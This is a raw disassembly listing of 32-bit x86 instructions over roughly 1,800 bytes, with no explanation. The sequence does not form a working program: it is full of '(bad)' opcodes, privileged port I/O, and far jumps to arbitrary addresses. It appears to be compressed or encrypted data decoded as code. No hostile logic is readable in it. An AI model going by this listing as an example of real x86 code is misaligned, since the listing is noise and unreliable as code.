  41bb5b:	xor    BYTE PTR [ecx-0x64bb80b9],bl
  41bb61:	pushf  
  41bb62:	aaa    
  41bb63:	mov    ds:0x7f3e6392,eax
  41bb68:	push   ebp
  41bb69:	pop    edx
  41bb6a:	xor    BYTE PTR [edx-0x54],cl
  41bb6d:	out    0x57,eax
  41bb6f:	(bad)
  41bb72:	mov    ch,0x1c
  41bb74:	leave  
  41bb75:	scas   al,BYTE PTR es:[edi]
  41bb76:	in     al,0xab
  41bb78:	test   eax,0xf2d8dbb5
  41bb7d:	popf   
  41bb7e:	xor    bh,BYTE PTR [ebx+0x499468a6]
  41bb84:	fs out 0x82,eax
  41bb87:	adc    ebx,0x6
  41bb8a:	mov    dh,0x45
  41bb8c:	mov    bh,0xdc
  41bb8e:	inc    ebp
  41bb8f:	pop    eax
  41bb90:	fwait
  41bb91:	xor    al,0xef
  41bb93:	mov    ebp,DWORD PTR [ebp-0x10]
  41bb96:	and    eax,0xd5ca304a
  41bb9b:	nop
  41bb9c:	pop    esi
  41bb9d:	ficomp DWORD PTR [esp+edx*8-0x65]
  41bba1:	cdq    
  41bba2:	jmp    0xfa3d72db
  41bba7:	cmc    
  41bba8:	fs sti 
  41bbaa:	xchg   esp,eax
  41bbab:	fs cmp dh,bl
  41bbae:	(bad)  
  41bbaf:	enter  0xfeb4,0x95
  41bbb3:	and    BYTE PTR [edx-0x6423b03e],bh
  41bbb9:	and    al,0xe6
  41bbbb:	ins    DWORD PTR es:[edi],dx
  41bbbc:	in     eax,dx
  41bbbd:	icebp  
  41bbbe:	rol    DWORD PTR [eax+ecx*8-0xc426ff2],cl
  41bbc5:	mov    esp,esp
  41bbc7:	fsubr  QWORD PTR [eax]
  41bbc9:	xchg   dh,cl
  41bbcb:	mov    esi,DWORD PTR [edx]
  41bbcd:	pop    esi
  41bbce:	fidiv  WORD PTR [edx]
  41bbd0:	shl    DWORD PTR [ebx],1
  41bbd2:	push   esi
  41bbd3:	sub    DWORD PTR [esi-0x1f],edi
  41bbd6:	xchg   edx,eax
  41bbd7:	push   es
  41bbd8:	adc    esi,edi
  41bbda:	or     eax,0x341f3b19
  41bbdf:	inc    esi
  41bbe0:	sbb    dl,BYTE PTR [ecx+0x44b3c690]
  41bbe6:	ins    BYTE PTR es:[edi],dx
  41bbe7:	(bad)  
  41bbe8:	retf   
  41bbe9:	xchg   ecx,eax
  41bbea:	or     al,0x51
  41bbec:	adc    DWORD PTR ss:[esi-0x62],0x52176145
  41bbf4:	imul   ecx,edi,0xd
  41bbf7:	lods   eax,DWORD PTR ds:[esi]
  41bbf8:	sbb    DWORD PTR ds:0x10774f90,0x9aa0298a
  41bc02:	dec    ebx
  41bc03:	mov    ebx,0x30c92623
  41bc08:	fwait
  41bc09:	test   eax,0x32ff6a2c
  41bc0e:	sub    ebx,esi
  41bc10:	fwait
  41bc11:	xor    DWORD PTR [ebx+edi*4],esp
  41bc14:	sub    DWORD PTR [edi],esi
  41bc16:	xchg   esp,eax
  41bc17:	daa    
  41bc18:	je     0x41bc37
  41bc1a:	xchg   ebx,edx
  41bc1c:	addr16 ror bl,0xe5
  41bc20:	popf   
  41bc21:	inc    ebx
  41bc22:	pusha  
  41bc23:	xlat   BYTE PTR ds:[ebx]
  41bc24:	push   0xffffffcb
  41bc26:	lock mov edx,ss
  41bc29:	repz (bad) 
  41bc2b:	push   edx
  41bc2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc2d:	inc    ecx
  41bc2e:	adc    DWORD PTR [esp+eax*2],ecx
  41bc31:	mov    ah,0xf6
  41bc33:	dec    ecx
  41bc34:	lahf   
  41bc35:	xlat   BYTE PTR ds:[ebx]
  41bc36:	jne    0x41bcb4
  41bc38:	xchg   edi,eax
  41bc39:	push   ecx
  41bc3a:	loop   0x41bc1e
  41bc3c:	xlat   BYTE PTR ds:[ebx]
  41bc3d:	retf   0x49e6
  41bc40:	jp     0x41bbcb
  41bc42:	mov    dh,0x7c
  41bc44:	xor    DWORD PTR [esi],ecx
  41bc46:	jmp    0xab99de94
  41bc4b:	pop    dx
  41bc4d:	sub    eax,0x6e9e3be4
  41bc52:	fld    QWORD PTR [edi-0x1604f469]
  41bc58:	shl    dh,0x43
  41bc5b:	dec    edx
  41bc5c:	popa   
  41bc5d:	or     DWORD PTR gs:[edx-0x2d08d0a6],eax
  41bc64:	fwait
  41bc65:	adc    al,0x3e
  41bc67:	and    BYTE PTR [edi-0x1831efac],bl
  41bc6d:	jmp    0x41bc6b
  41bc6f:	mov    DWORD PTR [esi-0x23],ebp
  41bc72:	xor    BYTE PTR [ebp-0xf6a971d],bl
  41bc78:	mov    edx,0x9bc53d14
  41bc7d:	sub    edi,DWORD PTR [edx+0x41]
  41bc80:	lods   al,BYTE PTR ds:[esi]
  41bc81:	out    dx,eax
  41bc82:	aaa    
  41bc83:	(bad)
  41bc86:	in     eax,dx
  41bc87:	dec    ecx
  41bc88:	je     0x41bc90
  41bc8a:	adc    eax,0x6e7a6650
  41bc8f:	sbb    ebp,DWORD PTR [ebx]
  41bc91:	icebp  
  41bc92:	(bad)  
  41bc93:	outs   dx,BYTE PTR ds:[esi]
  41bc94:	popa   
  41bc95:	mov    ds:0xfaa7ea52,eax
  41bc9a:	cmp    ecx,DWORD PTR [edx-0x74]
  41bc9d:	gs cmp BYTE PTR gs:[edi],al
  41bca1:	les    edi,FWORD PTR [edi-0x62]
  41bca4:	fwait
  41bca5:	inc    ebp
  41bca6:	pop    esp
  41bca7:	sub    eax,0x4baf778
  41bcac:	test   eax,0xc7efc6fa
  41bcb1:	mov    al,ds:0xfe2dc152
  41bcb6:	setle  ah
  41bcb9:	sbb    DWORD PTR [eax+0x7289cc51],edx
  41bcbf:	jae    0xa8b9455
  41bcc5:	scas   al,BYTE PTR es:[edi]
  41bcc6:	inc    edi
  41bcc7:	adc    dh,BYTE PTR [ebx+ebx*1]
  41bcca:	loope  0x41bc59
  41bccc:	mov    ecx,0x9b3665c6
  41bcd1:	cmp    edi,DWORD PTR [edi+0x78]
  41bcd4:	int3   
  41bcd5:	xchg   ebx,eax
  41bcd6:	pop    edi
  41bcd7:	dec    edx
  41bcd8:	out    0x7e,eax
  41bcda:	lea    esp,[edi-0x49]
  41bcdd:	push   esp
  41bcde:	fdiv   DWORD PTR [ebp+ebx*4+0x35]
  41bce2:	in     eax,dx
  41bce3:	cmc    
  41bce4:	sub    eax,0x3b8a2ef3
  41bce9:	(bad)  
  41bcea:	repnz push edx
  41bcec:	mov    esp,0x9b142d1c
  41bcf1:	push   ecx
  41bcf2:	call   0x93e85e80
  41bcf7:	push   ebx
  41bcf8:	rol    ah,cl
  41bcfa:	dec    eax
  41bcfb:	mov    ss:0x79052bad,al
  41bd01:	aam    0xc9
  41bd03:	sub    ebp,edx
  41bd05:	fld    QWORD PTR [edx]
  41bd07:	jg     0x41bd41
  41bd09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd0a:	push   0xffffff98
  41bd0c:	in     al,dx
  41bd0d:	xor    al,0x90
  41bd0f:	dec    edx
  41bd10:	jp     0x41bc98
  41bd12:	fwait
  41bd13:	mov    esp,esp
  41bd15:	inc    esp
  41bd16:	mov    ebp,0x5e3b074a
  41bd1b:	int3   
  41bd1c:	(bad)  
  41bd1d:	pop    eax
  41bd1e:	xchg   ebx,eax
  41bd1f:	cmp    DWORD PTR [esi-0x2a906f61],edx
  41bd25:	and    eax,0x1ce650e9
  41bd2a:	jns    0x41bd76
  41bd2c:	sub    edi,DWORD PTR ds:0xe61ce62
  41bd32:	das    
  41bd33:	pop    es
  41bd34:	fwait
  41bd35:	lods   al,BYTE PTR ds:[esi]
  41bd36:	and    ebp,DWORD PTR [bx]
  41bd39:	jecxz  0x41bceb
  41bd3b:	shr    edi,cl
  41bd3d:	(bad)  [edi]
  41bd3f:	out    dx,eax
  41bd40:	stos   BYTE PTR es:[edi],al
  41bd41:	scas   eax,DWORD PTR es:[edi]
  41bd42:	fiadd  DWORD PTR [eax]
  41bd44:	add    BYTE PTR [esi-0x21c78d31],bl
  41bd4a:	daa    
  41bd4b:	push   esp
  41bd4c:	scas   al,BYTE PTR es:[edi]
  41bd4d:	inc    ebx
  41bd4e:	cwde   
  41bd4f:	je     0x41bcdc
  41bd51:	fisub  WORD PTR [eax+0x24aed62b]
  41bd57:	ror    DWORD PTR [edx-0x52],1
  41bd5a:	nop
  41bd5b:	sbb    eax,0xada3a168
  41bd60:	sub    edx,DWORD PTR [ebp+0x3dcc4a1d]
  41bd66:	repnz xor cl,bh
  41bd69:	jmp    0x4094:0x7c9b48e9
  41bd70:	data16 xlat BYTE PTR ds:[ebx]
  41bd72:	sbb    DWORD PTR [esi+0x4a67d7a5],ebx
  41bd78:	out    dx,al
  41bd79:	pop    ss
  41bd7a:	sti    
  41bd7b:	mov    ds:0x27412323,al
  41bd80:	fwait
  41bd81:	push   eax
  41bd82:	or     BYTE PTR ds:0x3652cb97,bl
  41bd88:	repz fnstsw WORD PTR [eiz*8+0x64c5e00c]
  41bd90:	into   
  41bd91:	mov    dl,0x90
  41bd93:	test   DWORD PTR [ebx-0x5e],edi
  41bd96:	fnstsw WORD PTR [esi-0x8]
  41bd99:	and    al,0xa8
  41bd9b:	dec    ecx
  41bd9c:	mov    eax,0x83c4864c
  41bda1:	cli    
  41bda2:	mov    esp,0x4795a20f
  41bda7:	sbb    BYTE PTR [ecx],cl
  41bda9:	test   al,0xf0
  41bdab:	xchg   esi,eax
  41bdac:	mov    esi,0xd457a074
  41bdb1:	mov    ch,0x9b
  41bdb3:	and    al,0x1b
  41bdb5:	inc    ebp
  41bdb6:	cmp    bh,BYTE PTR gs:[edx-0x3d]
  41bdba:	or     DWORD PTR [ebx+ebx*4+0x46],esi
  41bdbe:	int3   
  41bdbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdc0:	adc    BYTE PTR [edx],dh
  41bdc2:	push   0x75
  41bdc4:	nop
  41bdc5:	fimul  WORD PTR [ebx]
  41bdc7:	rol    BYTE PTR [ecx],cl
  41bdc9:	int    0xee
  41bdcb:	test   BYTE PTR [ebx-0x662d6f62],ah
  41bdd1:	pop    eax
  41bdd2:	aas    
  41bdd3:	repz mov dl,0xc6
  41bdd6:	out    dx,eax
  41bdd7:	dec    ecx
  41bdd8:	xor    dl,al
  41bdda:	or     esi,DWORD PTR [eax-0x7]
  41bddd:	fimul  DWORD PTR [edx+0x28]
  41bde0:	mov    ds:0xd75d12b2,al
  41bde5:	xor    DWORD PTR [eax],eax
  41bde7:	enter  0xb5d2,0x91
  41bdeb:	dec    ecx
  41bdec:	dec    edi
  41bded:	adc    eax,DWORD PTR [ebp+0x5d492cc3]
  41bdf3:	cmp    eax,0xd7aee29b
  41bdf8:	stc    
  41bdf9:	push   eax
  41bdfa:	mov    al,0x42
  41bdfc:	mov    dl,0xdd
  41bdfe:	jnp    0x41be3c
  41be00:	ins    BYTE PTR es:[edi],dx
  41be01:	in     al,dx
  41be02:	and    dl,BYTE PTR [ebp-0x75]
  41be05:	test   al,0xcf
  41be07:	bound  ecx,QWORD PTR [ecx]
  41be09:	fiadd  WORD PTR [ecx-0x6]
  41be0c:	sub    al,0xb
  41be0e:	sbb    DWORD PTR [ecx],ebp
  41be10:	call   0xa434:0x93690fe5
  41be17:	leave  
  41be18:	push   ebx
  41be19:	mov    ebx,DWORD PTR [edx+0x70]
  41be1c:	fwait
  41be1d:	(bad)  
  41be1e:	cwde   
  41be1f:	push   ebx
  41be20:	add    al,0x2f
  41be22:	rcr    ecx,1
  41be24:	xchg   DWORD PTR [ebx+0x7],ebx
  41be27:	dec    edx
  41be28:	or     al,0x8a
  41be2a:	call   FWORD PTR [edx]
  41be2c:	mov    al,ds:0x9b874243
  41be31:	clc    
  41be32:	mov    ebx,DWORD PTR [edx+0xf55375]
  41be38:	in     al,0xde
  41be3a:	ja     0x41bddc
  41be3c:	aas    
  41be3d:	dec    eax
  41be3e:	pop    es
  41be3f:	icebp  
  41be40:	or     DWORD PTR [edi+0x7b],0x59811d8a
  41be47:	mov    bl,0xbf
  41be49:	mov    cl,dh
  41be4b:	inc    ebp
  41be4c:	fwait
  41be4d:	enter  0x7c5f,0x15
  41be51:	jmp    0x41bed0
  41be53:	dec    ebp
  41be54:	dec    esp
  41be55:	or     al,0x11
  41be57:	mov    bh,0x12
  41be59:	sbb    al,0x18
  41be5b:	sbb    eax,0x65901881
  41be60:	and    ebp,DWORD PTR [esp+ecx*8-0x77]
  41be64:	inc    edx
  41be65:	int    0xf1
  41be67:	dec    ecx
  41be68:	shr    dl,0x51
  41be6b:	jmp    0x41bedd
  41be6d:	xchg   esp,eax
  41be6e:	jle    0x41be5f
  41be70:	sbb    BYTE PTR [esi-0x2966e26c],cl
  41be76:	jl     0x41be68
  41be78:	sbb    ebx,DWORD PTR [ebp-0x2211139d]
  41be7e:	jo     0x41be5b
  41be80:	shr    BYTE PTR [ecx+0x12a13ff3],0x90
  41be87:	and    BYTE PTR [edx+esi*8],bl
  41be8a:	or     al,0x68
  41be8c:	or     eax,0xdd868827
  41be91:	adc    eax,0xa88f5290
  41be96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be97:	dec    edx
  41be98:	sub    DWORD PTR [edx-0x70],edi
  41be9b:	dec    esi
  41be9c:	and    edx,DWORD PTR [ebx+0x55]
  41be9f:	lahf   
  41bea0:	inc    esi
  41bea1:	xor    al,0x23
  41bea3:	dec    edx
  41bea4:	xchg   ecx,eax
  41bea5:	cmp    BYTE PTR [edx+ebx*4-0x270245b5],ch
  41beac:	mov    ebx,DWORD PTR [ecx-0x53]
  41beaf:	add    DWORD PTR [edx+0x196d5060],esi
  41beb5:	arpl   WORD PTR [esi+0x37],cx
  41beb8:	mov    ebp,0x97a844dd
  41bebd:	neg    BYTE PTR [esi+0x40d82d14]
  41bec3:	adc    eax,0x90eb3aa2
  41bec8:	add    eax,eax
  41beca:	mov    al,0x24
  41becc:	inc    edi
  41becd:	enter  0x49a5,0xa1
  41bed1:	fwait
  41bed2:	loopne 0x41bf05
  41bed4:	sbb    eax,0xc1ce1182
  41bed9:	mov    al,ds:0x67a619a9
  41bede:	inc    ebx
  41bedf:	dec    edx
  41bee0:	push   esi
  41bee1:	adc    esp,ecx
  41bee3:	aam    0x8d
  41bee5:	fidiv  WORD PTR [edi]
  41bee7:	mov    dh,BYTE PTR [esi-0xd]
  41beea:	cwde   
  41beeb:	leave  
  41beec:	push   cs
  41beed:	das    
  41beee:	scas   al,BYTE PTR es:[edi]
  41beef:	lods   eax,DWORD PTR ds:[esi]
  41bef0:	hlt    
  41bef1:	mov    cl,0x80
  41bef3:	sub    BYTE PTR [edi],bh
  41bef5:	cmp    BYTE PTR [ecx],ah
  41bef7:	dec    edx
  41bef8:	pushf  
  41bef9:	or     al,0x6d
  41befb:	xor    eax,0x29d8776
  41bf00:	fwait
  41bf01:	xlat   BYTE PTR ds:[ebx]
  41bf02:	mov    DWORD PTR [ebx+0x674ccb45],eax
  41bf08:	(bad)  
  41bf09:	(bad)  
  41bf0b:	(bad)  
  41bf0c:	addr16 (bad) 
  41bf0e:	loopne 0x41bf6e
  41bf10:	rep lods eax,DWORD PTR ds:[esi]
  41bf12:	iret   
  41bf13:	cmp    eax,0xb7939d11
  41bf18:	test   edx,edi
  41bf1a:	cmp    al,BYTE PTR [ecx+0x5c]
  41bf1d:	pop    esi
  41bf1e:	stos   DWORD PTR es:[edi],eax
  41bf1f:	ins    BYTE PTR es:[edi],dx
  41bf20:	push   eax
  41bf21:	in     eax,dx
  41bf22:	cdq    
  41bf23:	in     eax,dx
  41bf24:	lock push ss
  41bf26:	rcl    BYTE PTR ds:0xfbbd56aa,1
  41bf2c:	fwait
  41bf2d:	cmp    eax,0x6db49a72
  41bf32:	or     eax,0x80de318d
  41bf37:	lods   eax,DWORD PTR ds:[esi]
  41bf38:	pushf  
  41bf39:	ja     0x41bf09
  41bf3b:	and    bh,ch
  41bf3d:	sbb    dl,BYTE PTR [eax-0x479d0fbd]
  41bf43:	in     al,0xaa
  41bf45:	inc    edi
  41bf46:	fs ss sbb eax,0xa88362df
  41bf4d:	mov    al,ds:0xc67625ed
  41bf52:	call   0xcb7f:0x7aa19bdf
  41bf59:	in     eax,dx
  41bf5a:	aad    0x8c
  41bf5c:	ins    DWORD PTR es:[edi],dx
  41bf5d:	in     eax,dx
  41bf5e:	xchg   edi,eax
  41bf5f:	ret    
  41bf60:	adc    ebx,DWORD PTR [edi+edx*2-0x37]
  41bf64:	fisubr DWORD PTR [ebp+0x32b0f8f]
  41bf6a:	nop
  41bf6b:	aam    0x2c
  41bf6d:	sub    eax,0xa07f1d33
  41bf72:	icebp  
  41bf73:	dec    ecx
  41bf74:	stos   BYTE PTR es:[edi],al
  41bf75:	pop    esp
  41bf76:	pop    ds
  41bf77:	js     0x41bf55
  41bf79:	mov    ch,0x39
  41bf7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf7c:	fwait
  41bf7d:	dec    ebp
  41bf7e:	mov    ebx,0x4c04bb34
  41bf83:	arpl   WORD PTR [edi+ebx*8+0x6c],bx
  41bf87:	adc    edx,0xffffffbb
  41bf8a:	jne    0x41bf48
  41bf8c:	sbb    al,0xcd
  41bf8e:	inc    eax
  41bf8f:	int3   
  41bf90:	mov    edx,0x35f09efd
  41bf95:	or     eax,0xf37f717f
  41bf9a:	pop    edi
  41bf9b:	mov    edx,0x4a8e3b0f
  41bfa0:	push   esi
  41bfa1:	shl    BYTE PTR [ecx],0xd5
  41bfa4:	sbb    bl,al
  41bfa6:	mov    ecx,0x30969b73
  41bfab:	add    al,0x2b
  41bfad:	je     0x41bfd6
  41bfaf:	cwde   
  41bfb0:	inc    edx
  41bfb1:	fisubr WORD PTR [esi-0x38]
  41bfb4:	sti    
  41bfb5:	les    ebx,FWORD PTR [ebx-0x6f936fab]
  41bfbb:	adc    eax,DWORD PTR [esi]
  41bfbd:	idiv   ecx
  41bfbf:	aad    0x5e
  41bfc1:	js     0x41bf51
  41bfc3:	dec    edx
  41bfc4:	aaa    
  41bfc5:	jns    0x41bffd
  41bfc7:	push   eax
  41bfc8:	imul   BYTE PTR [esi+0x659b0ef6]
  41bfce:	repz dec esp
  41bfd0:	mov    ecx,DWORD PTR [edi+0x27]
  41bfd3:	shl    DWORD PTR [ecx-0x22],0x67
  41bfd7:	int    0xcc
  41bfd9:	not    DWORD PTR [ecx+0x38]
  41bfdc:	xlat   BYTE PTR ds:[ebx]
  41bfdd:	jmp    0xd057:0x3fec9ead
  41bfe4:	fist   WORD PTR [eax-0x4782d5b2]
  41bfea:	adc    ebx,DWORD PTR [ecx]
  41bfec:	push   edi
  41bfed:	loopne 0x41c03f
  41bfef:	adc    BYTE PTR [edx],al
  41bff1:	cmp    eax,0xa85be42b
  41bff6:	xchg   ecx,eax
  41bff7:	out    0x9b,al
  41bff9:	push   ss
  41bffa:	dec    eax
  41bffb:	cs sub al,0xf6
  41bffe:	mov    ds,WORD PTR [esi-0x9]
  41c001:	fld    QWORD PTR [ebx-0x3a2a5627]
  41c007:	push   ds
  41c008:	clc    
  41c009:	aas    
  41c00a:	nop
  41c00b:	(bad)
  41c00e:	mov    eax,gs
  41c010:	repz pushf 
  41c012:	aam    0x4d
  41c014:	jnp    0x41c032
  41c016:	jbe    0x41c06d
  41c018:	mov    cl,0x5d
  41c01a:	div    bh
  41c01c:	mov    al,0x60
  41c01e:	xchg   ecx,eax
  41c01f:	pop    esp
  41c020:	(bad)  
  41c022:	jo     0x41bff8
  41c024:	clc    
  41c025:	dec    esp
  41c026:	mov    WORD PTR [edx],gs
  41c028:	inc    ecx
  41c029:	in     al,dx
  41c02a:	dec    edi
  41c02b:	inc    eax
  41c02c:	mov    ah,0xc8
  41c02e:	push   eax
  41c02f:	nop
  41c030:	or     eax,0xb7fcc454
  41c035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c036:	mov    BYTE PTR [ebp+0x1b],cl
  41c039:	aaa    
  41c03a:	scas   al,BYTE PTR es:[edi]
  41c03b:	lea    esi,[ebx-0x37af58b8]
  41c041:	or     al,bh
  41c043:	inc    ebx
  41c044:	mov    DWORD PTR [esi],ebx
  41c046:	icebp  
  41c047:	fild   DWORD PTR [edi+0x39ed909b]
  41c04d:	add    bl,BYTE PTR [esi+0x7d]
  41c050:	xchg   ebx,eax
  41c051:	inc    ecx
  41c052:	mov    ds:0xc92d7c58,eax
  41c057:	ret    0x983b
  41c05a:	iret   
  41c05b:	jb     0x41c03b
  41c05d:	xor    DWORD PTR [eax-0x1037a162],edx
  41c063:	push   ss
  41c064:	xor    al,0x38
  41c066:	xor    eax,0x6e9c156
  41c06b:	fcmove st,st(3)
  41c06d:	not    BYTE PTR [edx+0x38b47b15]
  41c073:	test   al,0x7c
  41c075:	xchg   DWORD PTR [ebx-0xf],eax
  41c078:	mov    ebx,0x6e5954a8
  41c07d:	push   ecx
  41c07e:	repnz mov al,0x3b
  41c081:	xor    DWORD PTR [eax+eax*8+0x1c],ecx
  41c085:	dec    edi
  41c086:	add    bh,dl
  41c088:	fwait
  41c089:	icebp  
  41c08a:	jnp    0x41c05e
  41c08c:	int    0x38
  41c08e:	push   ds
  41c08f:	retf   0xddd9
  41c092:	push   es
  41c093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c094:	sbb    BYTE PTR [ecx-0x66230a00],0x90
  41c09b:	mov    dl,0xfc
  41c09d:	sub    ebp,DWORD PTR [ebp-0x44e6cc6a]
  41c0a3:	pop    eax
  41c0a4:	das    
  41c0a5:	mov    bl,0x85
  41c0a7:	lds    ecx,FWORD PTR [ecx-0x32]
  41c0aa:	mov    al,0x90
  41c0ac:	push   esp
  41c0ad:	mov    BYTE PTR [ebp+0x52],cl
  41c0b0:	popf   
  41c0b1:	xor    DWORD PTR [ecx-0x75d4ec38],edx
  41c0b7:	sub    bl,BYTE PTR [eax+0x114a6f74]
  41c0bd:	scas   al,BYTE PTR es:[edi]
  41c0be:	push   esi
  41c0bf:	fiadd  DWORD PTR [esi+0x46]
  41c0c2:	test   eax,0x49a89b84
  41c0c7:	(bad)  
  41c0c8:	push   cs
  41c0c9:	or     DWORD PTR es:[bx+0x1d],eax
  41c0ce:	cmp    BYTE PTR [ebp-0x63],bh
  41c0d1:	jns    0x41c061
  41c0d3:	mov    ebx,0xe0d0740b
  41c0d8:	repz call DWORD PTR [ecx-0x201b0f82]
  41c0df:	mov    ch,0x18
  41c0e1:	ror    DWORD PTR [edi],0xd
  41c0e4:	sbb    BYTE PTR [esi+0x6c],0xe9
  41c0e8:	call   0x946b78ca
  41c0ed:	ret    0xaaa0
  41c0f0:	mov    edx,0xdc808fee
  41c0f5:	shl    esi,1
  41c0f7:	arpl   WORD PTR [edi],dx
  41c0f9:	popf   
  41c0fa:	call   0x1de7:0x6121d549
  41c101:	dec    esi
  41c102:	xor    al,0x76
  41c104:	pushf  
  41c105:	ja     0x41c15f
  41c107:	inc    esp
  41c108:	pop    edi
  41c109:	adc    BYTE PTR [eax+0x26],0x5f
  41c10d:	mov    ss,WORD PTR [ecx+0x4a]
  41c110:	dec    ecx
  41c111:	sub    DWORD PTR [edi-0x6d],0x31
  41c115:	fisttp DWORD PTR [esi+0x23]
  41c118:	fwait
  41c119:	mov    esi,0x5f44b1bd
  41c11e:	iret   
  41c11f:	push   edx
  41c120:	jg     0x41c100
  41c122:	mov    dh,0xfe
  41c124:	ins    DWORD PTR es:[edi],dx
  41c125:	dec    ecx
  41c126:	and    eax,0x906ad8ee
  41c12b:	cmp    al,0x9d
  41c12d:	mov    ebp,0xb9af8c0
  41c132:	(bad)  
  41c133:	dec    edx
  41c134:	stos   DWORD PTR es:[edi],eax
  41c135:	fs aaa 
  41c137:	push   edi
  41c138:	or     eax,0x1d327712
  41c13d:	pop    ebp
  41c13e:	nop
  41c13f:	in     al,0x31
  41c141:	out    0xb1,al
  41c143:	jmp    0x93e4:0x4d590837
  41c14a:	out    dx,al
  41c14b:	iret   
  41c14c:	adc    eax,DWORD PTR [esi+0x68]
  41c14f:	int    0x22
  41c151:	stc    
  41c152:	(bad)  
  41c153:	loopne 0x41c10c
  41c155:	inc    ebx
  41c156:	imul   edi,DWORD PTR [edi+0x5e],0xf2da59b9
  41c15d:	ret    
  41c15e:	pop    ebp
  41c15f:	dec    edx
  41c160:	fcmovnb st,st(1)
  41c162:	pop    ebx
  41c163:	pop    ds
  41c164:	das    
  41c165:	test   bl,al
  41c167:	jbe    0x41c104
  41c169:	lods   al,BYTE PTR ds:[esi]
  41c16a:	scas   eax,DWORD PTR es:[edi]
  41c16b:	outs   dx,DWORD PTR ds:[esi]
  41c16c:	push   ecx
  41c16d:	cs pop eax
  41c16f:	sub    edi,DWORD PTR [esi-0x21]
  41c172:	scas   eax,DWORD PTR es:[edi]
  41c173:	jle    0x41c138
  41c175:	mov    cs,WORD PTR [edi-0x31]
  41c178:	out    dx,eax
  41c179:	aad    0x11
  41c17b:	xor    edi,esp
  41c17d:	push   esp
  41c17e:	ds push ecx
  41c180:	cmp    ah,BYTE PTR [edx+0x10]
  41c183:	inc    ebp
  41c184:	retf   
  41c185:	inc    ecx
  41c186:	ret    
  41c187:	xor    al,0x16
  41c189:	in     eax,dx
  41c18a:	xchg   esp,eax
  41c18b:	xchg   esi,eax
  41c18c:	push   es
  41c18d:	jmp    0x41c1df
  41c18f:	push   ecx
  41c190:	push   cs
  41c191:	loop   0x41c181
  41c193:	test   eax,0xfd8fff04
  41c198:	enter  0x294b,0xf1
  41c19c:	lock shr DWORD PTR [eax+0x4d],cl
  41c1a0:	aam    0x51
  41c1a2:	mov    edx,0x880f52b5
  41c1a7:	dec    edi
  41c1a8:	sub    ebx,edi
  41c1aa:	jge    0x41c133
  41c1ac:	sahf   
  41c1ad:	mov    ecx,0x44229cee
  41c1b2:	or     eax,DWORD PTR [edx+0x75]
  41c1b5:	(bad)  
  41c1b6:	ror    BYTE PTR [ecx-0x44],cl
  41c1b9:	adc    BYTE PTR [edi-0x67ad810f],0x92
  41c1c0:	fwait
  41c1c1:	iret   
  41c1c2:	std    
  41c1c3:	sub    DWORD PTR [ebx-0x5d],ecx
  41c1c6:	int    0xde
  41c1c8:	mov    bh,0xdd
  41c1ca:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1cc:	mov    ds:0xf64e8349,al
  41c1d1:	outs   dx,BYTE PTR ds:[esi]
  41c1d2:	nop
  41c1d3:	pop    edi
  41c1d4:	inc    ebp
  41c1d5:	daa    
  41c1d6:	and    DWORD PTR [eax+0x499aefa9],0xaef22515
  41c1e0:	mov    al,0xb8
  41c1e2:	pop    edi
  41c1e3:	xchg   edx,eax
  41c1e4:	fwait
  41c1e5:	or     eax,DWORD PTR ds:0x28a5f777
  41c1eb:	cmp    al,0x62
  41c1ed:	shl    al,1
  41c1ef:	dec    ecx
  41c1f0:	out    0xaa,eax
  41c1f2:	cmp    BYTE PTR [esi],al
  41c1f4:	push   eax
  41c1f5:	std    
  41c1f6:	add    esi,DWORD PTR [ecx-0x65]
  41c1f9:	lds    ebp,FWORD PTR [esi-0x23]
  41c1fc:	sbb    eax,0x13faf99d
  41c201:	fdivp  st(2),st
  41c203:	sub    ch,dh
  41c205:	fwait
  41c206:	stos   BYTE PTR es:[edi],al
  41c207:	ss pop esi
  41c209:	cmp    al,0xce
  41c20b:	cs jne 0x41c26c
  41c20e:	das    
  41c20f:	xchg   DWORD PTR [esi],ebp
  41c211:	add    cl,cl
  41c213:	adc    BYTE PTR ds:0xb551a4de,dl
  41c219:	jmp    0x41c1c0
  41c21b:	stos   BYTE PTR es:[edi],al
  41c21c:	inc    ecx
  41c21d:	push   esi
  41c21e:	sahf   
  41c21f:	xor    DWORD PTR [eax-0x4e],ebx
  41c222:	xor    eax,0x77395b66
  41c227:	hlt    
  41c228:	ja     0x41c26b
  41c22a:	les    ecx,FWORD PTR [ecx+0x4d]
  41c22d:	push   edx
  41c22e:	inc    esi
  41c22f:	mov    bh,0x6b
  41c231:	inc    esp
  41c232:	jmp    FWORD PTR [edx]
  41c234:	xchg   ecx,eax
  41c235:	add    BYTE PTR [eax+0x1cc8098],dl
  41c23b:	push   cs
  41c23c:	jg     0x41c262
  41c23e:	cmp    DWORD PTR [edx+0x14],ecx
  41c241:	add    al,0x91
  41c243:	xor    edi,DWORD PTR [eax-0x29]
  41c246:	out    0xf4,eax
  41c248:	fwait
  41c249:	leave  
  41c24a:	sbb    ecx,DWORD PTR ds:0xb0fbbf3c
  41c250:	loopne 0x41c23a
  41c252:	les    edi,FWORD PTR [edx+0x190dae9]
  41c258:	stos   DWORD PTR es:[edi],eax
  41c259:	enter  0xe756,0x9b
  41c25d:	jbe    0x41c29f
  41c25f:	addr16 popf 
  41c261:	mov    al,ds:0xde931581
  41c266:	fs jo  0x41c2b8
  41c269:	test   DWORD PTR [ebx-0x13],esp
  41c26c:	imul   DWORD PTR [esi-0x2179c433]
  41c272:	cli    
  41c273:	ror    DWORD PTR [ecx],cl
  41c275:	pop    edx
  41c276:	mov    ds:0x231d65d1,eax
  41c27b:	(bad)  
  41c27c:	stos   BYTE PTR es:[edi],al
  41c27d:	fmul   QWORD PTR [edx]
  41c27f:	dec    esi
  41c280:	mov    al,ds:0x2468c362
  41c285:	fsubp  st(0),st
  41c287:	add    al,0xc4
  41c289:	or     esi,ebx
  41c28b:	mov    BYTE PTR [ebx-0x3c25acbe],bl
  41c291:	cmc    
  41c292:	(bad)  
  41c293:	xor    BYTE PTR [esi+ebx*8+0x4e],ch
  41c297:	add    DWORD PTR [edx-0x21],edi
  41c29a:	pop    ss
  41c29b:	pop    esp
